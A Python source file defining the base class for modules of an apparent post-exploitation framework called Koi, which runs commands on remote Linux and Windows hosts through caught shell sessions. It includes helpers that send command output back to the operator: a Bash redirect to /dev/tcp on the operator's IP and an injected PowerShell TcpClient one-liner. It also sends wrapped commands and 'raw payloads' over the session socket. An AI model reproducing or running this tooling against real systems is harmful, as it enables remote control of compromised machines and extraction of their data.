from __future__ import annotations

import re
import select
import time
import uuid
from abc import ABC, abstractmethod
from typing import TYPE_CHECKING, List, Literal, Optional, Union

if TYPE_CHECKING:
    from koi.session import Session

from koi.utils.models import CommandResult, StreamLine
from koi.utils import ui
from koi.utils.tcp import get_local_ip, spawn_recv_server

import argparse

_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
_ANSI_RE   = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]|\r')
_SELECT_TIMEOUT = 0.1

PlatformSpec = Union[
    Literal["linux", "windows_cmd", "windows_ps", "any"],
    List[Literal["linux", "windows_cmd", "windows_ps"]],
]

class CommandTimeout(Exception):
    def __init__(self, command: str, timeout: float):
        self.command = command
        self.timeout = timeout
        super().__init__(f"Command timed out after {timeout}s: {command}")


class KoiModule(ABC):
    """
    Base class for all Koi modules.

    Quickstart
    ----------
    Create a file in src/koi/modules/ and subclass KoiModule:

        from koi.modules.blueprint import KoiModule

        class MyModule(KoiModule):
            name        = "my_module"
            description = "Does something cool."

            def run(self) -> None:
                result = self.exec("whoami")
                self.ok(f"Running as: {result.stdout.strip()}")
    """

    #: Short identifier used to call the module from the CLI (e.g. "enum_linux")
    name: str = "unnamed_module"

    #: One-line summary shown in the module list
    description: str = "No description provided."

    #: Optional longer help text shown with `module help <name>`
    usage: str = ""

    #: Optional list of argument specifications
    arguments: list[dict] = []

    #: Optional category for grouping modules in the UI
    category: Optional[str] = None

    #: Supported platform(s): "linux", "windows_cmd", "windows_ps", "any",
    #: or a list combining multiple specific targets.
    platform: PlatformSpec = "any"

    @staticmethod
    def _clean(text: str) -> str:
        return _ANSI_RE.sub("", text).strip()

    @classmethod
    def supports(cls, os_type: Optional[str]) -> bool:
        """Return True if this module is compatible with the given session OS type."""
        if cls.platform == "any":
            return True
        if os_type is None:
            return False
        if isinstance(cls.platform, list):
            return os_type in cls.platform
        return cls.platform == os_type

    def __init__(
        self,
        session: "Session",
        args: Optional[List[str]] = None,
    ) -> None:
        """
        Parameters
        ----------
        session:
            The active :class:`~koi.main.Session` this module will operate on.
        args:
            Positional arguments passed after the module name on the CLI.
            e.g. ``module run enum_linux -t 30``   args == ["-t", "30"]
        """
        self.session = session
        self.raw_args = args or []
        self.args = self._parse_args()

        # Convenience shortcuts so module authors don't need extra imports
        self.ui = ui
        self.notify = ui.notify
        self.spinner = ui.Spinner
        self.breaker = ui.breaker_with_text
        self.box = ui.print_report_box

    def _parse_args(self):
        if not self.arguments:
            return argparse.Namespace()

        parser = argparse.ArgumentParser(prog=self.name, add_help=False)
        for arg in self.arguments:
            arg = arg.copy()
            flags = arg.pop("flags")
            if isinstance(flags, list) and not flags[0].startswith("-"):
                parser.add_argument(flags[0], **arg)
            else:
                parser.add_argument(*flags, **arg)

        try:
            return parser.parse_args(self.raw_args)
        except SystemExit:
            return argparse.Namespace()

    # -------------------------------------------------------------------------
    # Shared session helpers
    # -------------------------------------------------------------------------

    def _get_local_ip(self) -> str:
        """Return the local IP that routes toward the current session."""
        return get_local_ip(self.session.addr[0])

    def _win_query(self, ps_expr: str, timeout: float = 10.0) -> str:
        """
        Evaluate a PowerShell expression on the remote Windows target and return
        its string output.

        For plain (non-upgraded) sessions the result is read back inline via a
        sentinel marker.  For upgraded ConPtyShell sessions the output is a raw
        VT100 stream, so we redirect the result over a fresh side-channel TCP
        socket instead (same technique as _exec_clean for Linux).
        """
        if self.session.upgraded:
            return self._win_query_sidechannel(ps_expr, timeout)

        sentinel = uuid.uuid4().hex
        marker = f"__KOI_{sentinel}__"

        if self.session.os_type == "windows_ps":
            cmd = f"({ps_expr}); '{marker}'"
        else:
            inner = f"({ps_expr}); '{marker}'"
            cmd = f'powershell -NoProfile -NonInteractive -c "{inner}"'

        eol = self.session.eol
        enc = self.session.encoding
        self.session.conn.sendall((cmd + eol).encode(enc))

        buf = b""
        deadline = time.monotonic() + timeout
        lines: list[str] = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            r, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not r:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                text = raw.decode(enc, errors="replace").strip("\r\n ")
                text = _PS_PROMPT.sub("", text).strip()
                if not text or "Write-Host" in text:
                    continue
                if marker in text:
                    return lines[-1] if lines else ""
                lines.append(text)

        return lines[-1] if lines else ""

    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 10.0) -> str:
        """
        Variant of _win_query for upgraded (ConPtyShell) sessions.
        Opens a local TCP socket and asks PowerShell to push its result there,
        bypassing the VT100 stream entirely.
        """
        local_ip = self._get_local_ip()
        port, collect = spawn_recv_server(timeout=timeout)

        ps_cmd = (
            f"$_r=({ps_expr})|Out-String;"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
            f"$_s.Write($_b,0,$_b.Length);"
            f"$_s.Flush();$_c.Close()"
        )
        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
        return collect().decode("utf-8", errors="replace").strip()

    def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
        """Run a Linux command and collect its stdout via a side TCP channel."""
        local_ip = self._get_local_ip()
        port, collect = spawn_recv_server(timeout=timeout)
        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)
        return collect().decode("utf-8", errors="replace").strip()

    @abstractmethod
    def run(self) -> None:
        """
        Entry point for the module.  All business logic goes here.

        Available helpers
        -----------------
        self.exec(cmd)        -> CommandResult  (blocking, raises on timeout)
        self.exec_stream(cmd) -> Iterator[StreamLine]
        self.send(data)       -> bool  (raw bytes to the socket)
        self.notify(type, msg)
        self.spinner(msg)     -> context manager
        self.box(title, dict)
        self.breaker()
        self.session          -> Session dataclass (id, conn, addr, upgraded, …)
        self.args             -> list[str] from the CLI
        """
    def exec(self, command: str, timeout: float = 30.0):
        sentinel = uuid.uuid4().hex
        marker = f"__KOI_DONE_{sentinel}__"
        wrapped = (
            f'( {command} ); _rc=$?; '
            f'printf "\\n{marker}:$_rc\\n"\n'
        )
        self.session.conn.sendall(wrapped.encode("utf-8"))

        buf = b""
        deadline = time.monotonic() + timeout
        output_lines = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)

            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue

            chunk = self.session.conn.recv(4096)
            if not chunk:
                break

            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                text = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                if text.startswith(marker):
                    rc = int(text.split(":")[-1]) if ":" in text else 0
                    output = "\n".join(output_lines)
                    return CommandResult(
                        command=command,
                        returncode=rc,
                        stdout=output,
                        duration=time.monotonic() - (deadline - timeout),
                    )
                output_lines.append(text)

        return CommandResult(
            command=command, returncode=1,
            stdout="\n".join(output_lines),
            duration=0,
        )

    def exec_stream(self, command: str, timeout: float = 30.0):
        """
        Stream output of *command* line-by-line from the remote session as
        :class:`~koi.shell_handler.result.StreamLine` objects.

        Example::

            for line in self.exec_stream("find / -name '*.conf' 2>/dev/null"):
                self.notify('info', line.text)
        """
        sentinel = uuid.uuid4().hex
        marker   = f"__KOI_DONE_{sentinel}__"
        wrapped  = f'( {command} ); printf "\\n{marker}\\n"\n'
        self.session.conn.sendall(wrapped.encode("utf-8"))

        buf      = b""
        deadline = time.monotonic() + timeout

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise CommandTimeout(command, timeout)

            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
            if not ready:
                continue

            chunk = self.session.conn.recv(4096)
            if not chunk:
                return

            buf += chunk
            while b"\n" in buf:
                raw_line, buf = buf.split(b"\n", 1)
                text = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                if marker in text:
                    return
                yield StreamLine(text=text)

    def send(self, data: bytes) -> bool:
        """
        Write raw *bytes* directly to the session socket.
        Returns ``False`` if the session is no longer alive.

        Useful for sending keystrokes or raw payloads.
        """
        return self.session.send(data)

    def sendline(self, line: str, encoding: str = "utf-8") -> bool:
        """Convenience wrapper: encode *line* + newline and send it."""
        return self.send((line + "\n").encode(encoding))

    def ok(self, msg: str) -> None:
        """Print a success-style info notification."""
        self.notify("info", msg)

    def err(self, msg: str) -> None:
        """Print an error notification."""
        self.notify("error", msg)

    def warn(self, msg: str) -> None:
        """Print a warning notification."""
        self.notify("warning", msg)

    def status(self, msg: str) -> None:
        """Print a status notification."""
        self.notify("status", msg)
        
    def success(self, msg: str) -> None:
        """Print a success notification."""
        self.notify("success", msg)

    def __str__(self) -> str:
        return f"<KoiModule {self.name!r} on session #{self.session.id}>"

    def __repr__(self) -> str:
        return self.__str__()
